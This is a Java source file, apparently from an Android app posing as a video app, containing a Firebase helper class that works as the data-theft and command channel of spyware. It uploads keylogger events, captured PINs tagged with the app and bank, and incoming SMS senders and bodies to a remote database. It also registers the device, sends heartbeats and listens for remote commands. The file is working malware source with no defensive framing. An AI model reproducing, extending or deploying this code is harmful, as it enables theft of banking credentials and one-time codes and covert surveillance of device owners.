package com.xvideo.app.firebase;

import android.content.Context;
import android.util.Log;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;
import com.google.firebase.database.ValueEventListener;
import com.xvideo.app.core.Config;
import com.xvideo.app.util.DeviceInfoUtil;

import java.util.HashMap;
import java.util.Map;

public class FirebaseHelper {
    private static final String TAG = "FirebaseHelper";
    private final Context context;
    private final String deviceId;
    private final DatabaseReference dbRef;
    private final DatabaseReference clientRef;
    private ValueEventListener commandListener;

    public interface CommandCallback {
        void onCommand(Map<String, Object> command);
    }

    public FirebaseHelper(Context context) {
        this.context = context;
        this.deviceId = DeviceInfoUtil.getDeviceID(context);
        this.dbRef = FirebaseDatabase.getInstance().getReference();
        this.clientRef = dbRef.child(Config.PATH_CLIENTS).child(deviceId);
    }

    public void registerDevice(Map<String, Object> deviceInfo) {
        clientRef.setValue(deviceInfo)
            .addOnSuccessListener(aVoid -> Log.d(TAG, "Device registered"))
            .addOnFailureListener(e -> Log.e(TAG, "Registration failed: " + e.getMessage()));
    }

    public void updateDeviceInfo(Map<String, Object> info) {
        clientRef.updateChildren(info)
            .addOnSuccessListener(aVoid -> Log.d(TAG, "Device info updated"))
            .addOnFailureListener(e -> Log.e(TAG, "Update failed: " + e.getMessage()));
    }

    public void setOnlineStatus(boolean online) {
        clientRef.child("online").setValue(online);
        if (online) {
            clientRef.child("online").onDisconnect().setValue(false);
            clientRef.child("disconnectTime").onDisconnect().setValue(ServerValue.TIMESTAMP);
        }
    }

    public void sendHeartbeat() {
        clientRef.child("lastHeartbeat").setValue(ServerValue.TIMESTAMP);
    }

    public void logKeyloggerEvent(Map<String, Object> event) {
        clientRef.child(Config.PATH_KEYLOGGER).child(Config.PATH_EVENTS).push().setValue(event);
    }

    public void logCapturedPin(String pin, String app, int digits, String bank) {
        Map<String, Object> pinData = new HashMap<>();
        pinData.put("pin", pin);
        pinData.put("app", app);
        pinData.put("digits", digits);
        pinData.put("time", System.currentTimeMillis());
        if (bank != null) {
            pinData.put("bank", bank);
        }
        clientRef.child(Config.PATH_KEYLOGGER).child(Config.PATH_PINS).push().setValue(pinData);
    }

    public void logSms(long timestamp, String sender, String body, String type) {
        Map<String, Object> smsData = new HashMap<>();
        smsData.put("id", timestamp);
        smsData.put("sender", sender);
        smsData.put("body", body);
        smsData.put("type", type);
        smsData.put("timestamp", System.currentTimeMillis());

        dbRef.child(Config.PATH_SMS + deviceId).child(String.valueOf(timestamp)).setValue(smsData);
    }

    public void reportPermissions(Map<String, String> permissions) {
        permissions.put("checked_at", String.valueOf(System.currentTimeMillis()));
        clientRef.child("permissions").setValue(permissions);
    }

    public void listenForCommands(CommandCallback callback) {
        commandListener = clientRef.child(Config.PATH_COMMANDS).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (snapshot.exists() && snapshot.getValue() != null) {
                    try {
                        @SuppressWarnings("unchecked")
                        Map<String, Object> commands = (Map<String, Object>) snapshot.getValue();
                        callback.onCommand(commands);
                    } catch (Exception e) {
                        Log.e(TAG, "Error parsing commands", e);
                    }
                }
            }

            @Override
            public void onCancelled(DatabaseError error) {
                Log.e(TAG, "Command listener cancelled: " + error.getMessage());
            }
        });
    }

    public void deleteCommand(String commandPath) {
        clientRef.child(Config.PATH_COMMANDS).child(commandPath).removeValue();
    }

    public void sendPong() {
        Map<String, Object> pong = new HashMap<>();
        pong.put("text", "pong");
        pong.put("timestamp", ServerValue.TIMESTAMP);
        clientRef.child(Config.PATH_COMMANDS).child("pingResponse").setValue(pong);
    }

    public void stopListening() {
        if (commandListener != null) {
            clientRef.child(Config.PATH_COMMANDS).removeEventListener(commandListener);
        }
    }
}
